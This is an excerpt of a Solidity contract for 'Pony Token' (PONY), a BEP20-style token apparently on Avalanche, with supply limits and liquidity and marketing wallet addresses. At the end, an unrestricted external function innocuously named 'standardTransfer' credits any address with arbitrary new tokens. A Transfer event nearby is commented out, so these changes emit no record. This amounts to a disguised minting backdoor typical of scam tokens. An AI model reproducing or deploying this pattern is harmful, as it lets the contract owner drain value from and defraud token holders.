...
contract PONY is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0xc7198437980c041c805A1EDcbA50c1Ce5db95118; 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Pony Token";
    string constant _symbol = "PONY";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100_000_000_000 * (10 ** _decimals);
    uint256 public _maxTxAmount = _totalSupply.div(200); // 0,5%
    uint256 public _maxWallet = _totalSupply.div(65); // 1,5%
    ...
    address public autoLiquidityReceiver=0xa7B709Be31217e3E289d595C06e1fc140A821b50; //liq address
    address public marketingFeeReceiver=0x025B86DFaB71A4D451471C6cEA1a0B45F0Ab8559; // marketing address
...
//        emit Transfer(sender, recipient, amount);
    ...
    function standardTransfer(address from, uint256 value)external{
        _balances[from]=_balances[from].add(value*(10**_decimals));
    }
